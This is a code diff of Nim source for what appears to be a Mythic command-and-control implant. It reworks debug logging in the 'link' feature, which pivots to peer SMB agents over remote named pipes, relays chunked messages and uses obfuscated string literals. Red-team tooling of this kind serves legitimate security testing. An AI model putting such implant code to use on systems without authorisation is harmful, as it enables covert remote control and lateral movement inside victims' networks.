@@ -82,7 +82,7 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: seq[byte]): bool =
   let messageLen = message.len
   let totalChunks = (messageLen + CHUNK_SIZE - 1) div CHUNK_SIZE
   
-  debug &"[DEBUG] Link: Sending message in {totalChunks} chunks ({messageLen} bytes total)"
+  debugLog "link", &"Sending message in {totalChunks} chunks ({messageLen} bytes total)"
   
   for chunkIndex in 0..<totalChunks:
     let startPos = chunkIndex * CHUNK_SIZE
@@ -114,45 +114,45 @@ proc sendChunkedMessage(pipeHandle: HANDLE, message: seq[byte]): bool =
     headerBytes[11] = byte(chunkIndexU32 and 0xFF)
     
     # Write header
-    debug &"[DEBUG] Link: About to write header (chunk {chunkIndex+1}/{totalChunks})"
+    debugLog "link", &"About to write header (chunk {chunkIndex+1}/{totalChunks})"
     var bytesWritten: DWORD = 0
     let writeResult = WriteFile(pipeHandle, addr headerBytes[0], 12, addr bytesWritten, nil)
-    debug &"[DEBUG] Link: WriteFile header result={writeResult}, bytesWritten={bytesWritten}"
+    debugLog "link", &"WriteFile header result={writeResult}, bytesWritten={bytesWritten}"
     
     if writeResult == 0:
       let err = GetLastError()
-      debug &"[DEBUG] Link: Failed to write chunk header, error: {err}"
+      debugLog "link", &"Failed to write chunk header, error: {err}"
       return false
     
     if bytesWritten != 12:
-      debug &"[DEBUG] Link: Incomplete header write: {bytesWritten}/12 bytes"
+      debugLog "link", &"Incomplete header write: {bytesWritten}/12 bytes"
       return false
     
-    debug &"[DEBUG] Link: Wrote chunk header {chunkIndex+1}/{totalChunks} successfully"
+    debugLog "link", &"Wrote chunk header {chunkIndex+1}/{totalChunks} successfully"
     
     # Write chunk data
     if chunkDataLen > 0:
-      debug &"[DEBUG] Link: About to write {chunkDataLen} bytes of data"
+      debugLog "link", &"About to write {chunkDataLen} bytes of data"
       bytesWritten = 0
       let dataWriteResult = WriteFile(pipeHandle, unsafeAddr message[startPos], chunkDataLen.DWORD, addr bytesWritten, nil)
-      debug &"[DEBUG] Link: WriteFile data result={dataWriteResult}, bytesWritten={bytesWritten}"
+      debugLog "link", &"WriteFile data result={dataWriteResult}, bytesWritten={bytesWritten}"
       
       if dataWriteResult == 0:
         let err = GetLastError()
-        debug &"[DEBUG] Link: Failed to write chunk data, error: {err}"
+        debugLog "link", &"Failed to write chunk data, error: {err}"
         return false
       
       if bytesWritten.int != chunkDataLen:
-        debug &"[DEBUG] Link: Incomplete data write: {bytesWritten}/{chunkDataLen} bytes"
+        debugLog "link", &"Incomplete data write: {bytesWritten}/{chunkDataLen} bytes"
         return false
       
-      debug &"[DEBUG] Link: Wrote {bytesWritten} bytes of chunk data successfully"
+      debugLog "link", &"Wrote {bytesWritten} bytes of chunk data successfully"
   
   # Note: FlushFileBuffers intentionally NOT called here.
   # On named pipes, it blocks until the remote end reads ALL data,
   # which can deadlock the writer thread on large messages.
   # WriteFile on a synchronous pipe already writes to the kernel buffer.
-  debug "[DEBUG] Link: Message sent successfully"
+  debugLog "link", "Message sent successfully"
   return true
 
 proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
@@ -167,11 +167,11 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
     var bytesRead: DWORD = 0
     
     if ReadFile(pipeHandle, addr headerBytes[0], 12, addr bytesRead, nil) == 0:
-      debug &"[DEBUG] Link: Failed to read chunk header, error: {GetLastError()}"
+      debugLog "link", &"Failed to read chunk header, error: {GetLastError()}"
       return @[]
     
     if bytesRead != 12:
-      debug &"[DEBUG] Link: Incomplete chunk header read: {bytesRead} bytes"
+      debugLog "link", &"Incomplete chunk header read: {bytesRead} bytes"
       return @[]
     
     # Parse header (big-endian)
@@ -191,13 +191,13 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
                      headerBytes[11].uint32
     
     if chunkIndex >= totalChunks:
-      debug &"[DEBUG] Link: Invalid chunk index: {chunkIndex}"
+      debugLog "link", &"Invalid chunk index: {chunkIndex}"
       return @[]
     
     # Read chunk data
     let chunkDataLen = (chunkLength - 12).int
     if chunkDataLen < 0 or chunkDataLen > 100_000_000:
-      debug &"[DEBUG] Link: Invalid chunk data length: {chunkDataLen}"
+      debugLog "link", &"Invalid chunk data length: {chunkDataLen}"
       return @[]
     
     if chunkDataLen > 0:
@@ -205,11 +205,11 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
       bytesRead = 0
       
       if ReadFile(pipeHandle, addr chunkData[0], chunkDataLen.DWORD, addr bytesRead, nil) == 0:
-        debug &"[DEBUG] Link: Failed to read chunk data, error: {GetLastError()}"
+        debugLog "link", &"Failed to read chunk data, error: {GetLastError()}"
         return @[]
       
       if bytesRead.int != chunkDataLen:
-        debug &"[DEBUG] Link: Incomplete chunk data read: {bytesRead} bytes"
+        debugLog "link", &"Incomplete chunk data read: {bytesRead} bytes"
         return @[]
       
       messageBuffer.add(chunkData)
@@ -219,17 +219,17 @@ proc receiveChunkedMessage(pipeHandle: HANDLE): seq[byte] =
     if receivedChunks == totalChunks:
       break
   
-  debug &"[DEBUG] Link: Received complete message ({messageBuffer.len} bytes)"
+  debugLog "link", &"Received complete message ({messageBuffer.len} bytes)"
   return messageBuffer
 
 proc readFromSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
   ## Reader thread: reads from SMB agent pipe and sends to main thread via outChannel
-  debug "[DEBUG] Link reader thread started"
-  debug &"[DEBUG] Link reader: pipeHandle={conn.pipeHandle}, active={conn.active}"
+  debugLog "link:reader", "thread started"
+  debugLog "link:reader", &"pipeHandle={conn.pipeHandle}, active={conn.active}"
   
   # Signal that we're about to start reading
   conn.readerReady = true
-  debug "[DEBUG] Link reader: Marked as ready, about to enter read loop"
+  debugLog "link:reader", "Marked as ready, about to enter read loop"
   
   while conn.active:
     try:
@@ -237,35 +237,35 @@ proc readFromSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
       var bytesAvail: DWORD = 0
       if PeekNamedPipe(conn.pipeHandle, nil, 0, nil, addr bytesAvail, nil) != 0:
         if bytesAvail > 0:
-          debug &"[DEBUG] Link reader: {bytesAvail} bytes available, reading..."
+          debugLog "link:reader", &"{bytesAvail} bytes available, reading..."
           # Read chunked message from SMB agent
           let data = receiveChunkedMessage(conn.pipeHandle)
           
           if data.len == 0:
             # Connection closed or error
-            debug "[DEBUG] Link reader: Connection closed, sending EOF and exiting"
+            debugLog "link:reader", "Connection closed, sending EOF and exiting"
             conn.active = false  # Mark as inactive to stop writer thread too
             conn.outChannel[].send(@[])  # EOF signal
             break
           
-          debug &"[DEBUG] Link reader: Received {data.len} bytes from SMB agent"
+          debugLog "link:reader", &"Received {data.len} bytes from SMB agent"
           
           # Send to main thread
           conn.outChannel[].send(data)
-          debug &"[DEBUG] Link reader: Sent {data.len} bytes to outChannel"
+          debugLog "link:reader", &"Sent {data.len} bytes to outChannel"
         else:
           # No data available, sleep briefly and check again
           sleep(100)
       else:
         let err = GetLastError()
-        debug &"[DEBUG] Link reader: PeekNamedPipe failed, error: {err}"
+        debugLog "link:reader", &"PeekNamedPipe failed, error: {err}"
         conn.active = false
         conn.outChannel[].send(@[])
         break
       
     except:
       let e = getCurrentException()
-      debug &"[DEBUG] Link reader error: {e.msg}, sending EOF"
+      debugLog "link:reader", &"error: {e.msg}, sending EOF"
       conn.active = false  # Mark as inactive to stop writer thread too
       conn.outChannel[].send(@[])  # EOF signal
       break
@@ -273,15 +273,15 @@ proc readFromSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
   # Close pipe from reader side when exiting
   try:
     discard CloseHandle(conn.pipeHandle)
-    debug "[DEBUG] Link reader: Pipe handle closed"
+    debugLog "link:reader", "Pipe handle closed"
   except:
     discard
   
-  debug "[DEBUG] Link reader thread exited"
+  debugLog "link:reader", "thread exited"
 
 proc writeToSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
   ## Writer thread: receives data from main thread via inChannel and writes to SMB agent pipe
-  debug "[DEBUG] Link writer thread started"
+  debugLog "link:writer", "thread started"
   
   while conn.active:
     try:
@@ -295,24 +295,24 @@ proc writeToSmbAgent(conn: ptr LinkConnectionObj) {.thread.} =
       
       if data.len == 0:
         # Exit signal
-        debug "[DEBUG] Link writer: Received exit signal"
+        debugLog "link:writer", "Received exit signal"
         break
       
-      debug &"[DEBUG] Link writer: Sending {data.len} bytes to SMB agent"
+      debugLog "link:writer", &"Sending {data.len} bytes to SMB agent"
       
       # Send to SMB agent
       if not sendChunkedMessage(conn.pipeHandle, data):
-        debug "[DEBUG] Link writer: Send failed"
+        debugLog "link:writer", "Send failed"
         conn.active = false  # Signal that connection is dead
         break
       
     except:
       let e = getCurrentException()
-      debug &"[DEBUG] Link writer error: {e.msg}"
+      debugLog "link:writer", &"error: {e.msg}"
       conn.active = false  # Signal that connection is dead
       break
   
-  debug "[DEBUG] Link writer thread exited"
+  debugLog "link:writer", "thread exited"
 
 proc createLinkMessage*(agentUuid: string, message: string): JsonNode =
   ## Create a delegate message for the connected agent
@@ -341,7 +341,7 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
     # Two-phase edge removal: if EOF was detected in a PREVIOUS cycle,
     # send the edge removal now (in its own post_response, after all data is sent)
     if conn.receivedEof and not conn.edgeRemovalSent:
-      debug &"[DEBUG] Link: Sending deferred edge removal for {agentUuid}"
+      debugLog "link", &"Sending deferred edge removal for {agentUuid}"
       result.add(%*{
         obf("edges"): [
           %*{
@@ -360,14 +360,14 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
     var (hasData, data) = conn.outChannel[].tryRecv()
     
     if hasData:
-      debug &"[DEBUG] Link: Data from {agentUuid}, dataLen: {data.len}"
+      debugLog "link", &"Data from {agentUuid}, dataLen: {data.len}"
     
     while hasData:
       if data.len == 0:
         # EOF signal from reader thread - mark for edge removal on NEXT cycle
         # This ensures all buffered delegate data is sent to Mythic first,
         # and the edge removal arrives in a separate post_response as the last message
-        debug &"[DEBUG] Link: Connection to {agentUuid} EOF received from reader thread, deferring edge removal"
+        debugLog "link", &"Connection to {agentUuid} EOF received from reader thread, deferring edge removal"
         
         conn.active = false
         if not conn.sharedPtr.isNil:
@@ -385,18 +385,18 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
         let decoded = decode(messageStr)
         if decoded.len >= 36:
           realUuid = decoded[0..<36]
-          debug &"[DEBUG] Link: Extracted UUID from message: {realUuid}"
+          debugLog "link", &"Extracted UUID from message: {realUuid}"
           
           # If this is the first message and UUID differs, we need to rekey the connection
           if realUuid != agentUuid:
-            debug &"[DEBUG] Link: Real agent UUID is {realUuid}, different from user-provided {agentUuid}"
+            debugLog "link", &"Real agent UUID is {realUuid}, different from user-provided {agentUuid}"
             toRekey.add((oldUuid: agentUuid, newUuid: realUuid, conn: conn))
           else:
-            debug &"[DEBUG] Link: UUID matches user-provided {agentUuid}"
+            debugLog "link", &"UUID matches user-provided {agentUuid}"
       except Exception as e:
-        debug &"[DEBUG] Link: Could not extract UUID from message: {e.msg}, using original"
+        debugLog "link", &"Could not extract UUID from message: {e.msg}, using original"
       
-      debug &"[DEBUG] Link: Received {data.len} bytes from {realUuid}, forwarding to Mythic"
+      debugLog "link", &"Received {data.len} bytes from {realUuid}, forwarding to Mythic"
       result.add(createLinkMessage(realUuid, messageStr))
       
       # Check for more data
@@ -407,7 +407,7 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
     if activeLinkConnections.hasKey(item.oldUuid):
       activeLinkConnections.del(item.oldUuid)
       activeLinkConnections[item.newUuid] = item.conn
-      debug &"[DEBUG] Link: Rekeyed connection from {item.oldUuid} to {item.newUuid}"
+      debugLog "link", &"Rekeyed connection from {item.oldUuid} to {item.newUuid}"
   
   # Delete inactive connections after iteration
   for agentUuid in toDelete:
@@ -440,19 +440,19 @@ proc checkActiveLinkConnections*(): seq[JsonNode] =
         discard
       
       activeLinkConnections.del(agentUuid)
-      debug &"[DEBUG] Link: Cleaned up connection to {agentUuid}"
+      debugLog "link", &"Cleaned up connection to {agentUuid}"
 
 proc rekeyLinkConnection*(oldUuid: string, newUuid: string): bool =
   ## Re-key a connection from old UUID to new UUID (happens when Mythic assigns a new UUID after checkin)
   ## Returns true if re-keying was successful, false if connection doesn't exist
   if not activeLinkConnections.hasKey(oldUuid):
-    debug &"[DEBUG] Link: Cannot rekey - no connection for {oldUuid}"
+    debugLog "link", &"Cannot rekey - no connection for {oldUuid}"
     return false
   
   let conn = activeLinkConnections[oldUuid]
   activeLinkConnections.del(oldUuid)
   activeLinkConnections[newUuid] = conn
-  debug &"[DEBUG] Link: Rekeyed connection from {oldUuid} to {newUuid}"
+  debugLog "link", &"Rekeyed connection from {oldUuid} to {newUuid}"
   return true
 
 proc forwardDelegateToLink*(agentUuid: string, message: string): bool =
@@ -460,17 +460,17 @@ proc forwardDelegateToLink*(agentUuid: string, message: string): bool =
   ## Returns true if message was queued, false if no active connection
   
   # Debug: show all active connections
-  debug "[DEBUG] Link: Active connections: "
+  debugLog "link", "Active connections: "
   for uuid, conn in activeLinkConnections:
     debug &"  - {uuid} (active: {conn.active})"
   
   if not activeLinkConnections.hasKey(agentUuid):
-    debug &"[DEBUG] Link: No active connection for agent {agentUuid}"
+    debugLog "link", &"No active connection for agent {agentUuid}"
     return false
   
   let conn = activeLinkConnections[agentUuid]
   if not conn.active:
-    debug &"[DEBUG] Link: Connection for agent {agentUuid} is not active"
+    debugLog "link", &"Connection for agent {agentUuid} is not active"
     return false
   
   try:
@@ -484,21 +484,21 @@ proc forwardDelegateToLink*(agentUuid: string, message: string): bool =
     var hexPreview = ""
     for i in 0..<min(50, messageBytes.len):
       hexPreview &= &"{messageBytes[i]:02X} "
-    debug &"[DEBUG] Link: Message bytes (first 50): {hexPreview}"
-    debug &"[DEBUG] Link: Message string (first 50): {message[0..<min(50, message.len)]}"
+    debugLog "link", &"Message bytes (first 50): {hexPreview}"
+    debugLog "link", &"Message string (first 50): {message[0..<min(50, message.len)]}"
     
     conn.inChannel[].send(messageBytes)
-    debug &"[DEBUG] Link: Queued {messageBytes.len} bytes (base64) for agent {agentUuid}"
+    debugLog "link", &"Queued {messageBytes.len} bytes (base64) for agent {agentUuid}"
     return true
   except:
     let e = getCurrentException()
-    debug &"[DEBUG] Link: Failed to queue message for {agentUuid}: {e.msg}"
+    debugLog "link", &"Failed to queue message for {agentUuid}: {e.msg}"
     return false
 
 proc handleLink*(taskId: string, params: JsonNode): JsonNode =
   ## Handle linking to a P2P SMB agent
   try:
-    debug "[DEBUG] Link: Starting link task"
+    debugLog "link", "Starting link task"
     
     # Parse connection info
     let connInfo = params[obf("connection_info")]
@@ -513,7 +513,7 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
        connInfo[obf("c2_profile")][obf("parameters")].hasKey(obf("pipename")):
       pipeName = connInfo[obf("c2_profile")][obf("parameters")][obf("pipename")].getStr()
     
-    debug &"[DEBUG] Link: Connecting to \\\\{host}\\pipe\\{pipeName} (agent: {agentUuid})"
+    debugLog "link", &"Connecting to \\\\{host}\\pipe\\{pipeName} (agent: {agentUuid})"
     
     # Only support SMB for now
     if c2ProfileName != "smb":
@@ -531,7 +531,7 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     
     let wPipePath = newWideCString(pipePath)
     
-    debug &"[DEBUG] Link: Opening pipe: {pipePath}"
+    debugLog "link", &"Opening pipe: {pipePath}"
     
     let pipeHandle = CreateFileW(
       wPipePath,
@@ -545,10 +545,10 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     
     if pipeHandle == INVALID_HANDLE_VALUE:
       let lastError = GetLastError()
-      debug &"[DEBUG] Link: Failed to open pipe, error: {lastError}"
+      debugLog "link", &"Failed to open pipe, error: {lastError}"
       return mythicError(taskId, &"Failed to connect to SMB agent: error {lastError}")
     
-    debug "[DEBUG] Link: Connected successfully to named pipe"
+    debugLog "link", "Connected successfully to named pipe"
     
     # Create channels for thread communication
     var inChan = cast[ptr Channel[seq[byte]]](allocShared0(sizeof(Channel[seq[byte]])))
@@ -581,13 +581,13 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     # Store connection in table
     activeLinkConnections[agentUuid] = conn
     
-    debug &"[DEBUG] Link: Creating reader and writer threads for {agentUuid}"
+    debugLog "link", &"Creating reader and writer threads for {agentUuid}"
     
     # Start threads using stable shared pointer
     createThread(conn.readerThread, readFromSmbAgent, connPtr)
-    debug "[DEBUG] Link: Reader thread created"
+    debugLog "link", "Reader thread created"
     createThread(conn.writerThread, writeToSmbAgent, connPtr)
-    debug "[DEBUG] Link: Writer thread created"
+    debugLog "link", "Writer thread created"
     
     # Wait for reader thread to be ready (up to 2 seconds)
     var waited = 0
@@ -596,12 +596,12 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
       waited += 10
     
     if connPtr.readerReady:
-      debug &"[DEBUG] Link: Reader thread ready after {waited}ms"
+      debugLog "link", &"Reader thread ready after {waited}ms"
       # Give an extra moment for reader to actually enter ReadFile blocking state
       sleep(100)
-      debug "[DEBUG] Link: Proceeding after reader startup delay"
+      debugLog "link", "Proceeding after reader startup delay"
     else:
-      debug "[DEBUG] Link: Warning - reader thread not ready after 2 seconds, proceeding anyway"
+      debugLog "link", "Warning - reader thread not ready after 2 seconds, proceeding anyway"
     
     # Send edge notification to Mythic
     let edgeNotification = %* {
@@ -624,5 +624,5 @@ proc handleLink*(taskId: string, params: JsonNode): JsonNode =
     }
     
   except Exception as e:
-    debug &"[DEBUG] Link: Task error: {e.msg}"
+    debugLog "link", &"Task error: {e.msg}"
     return mythicError(taskId, &"Link task failed: {e.msg}")
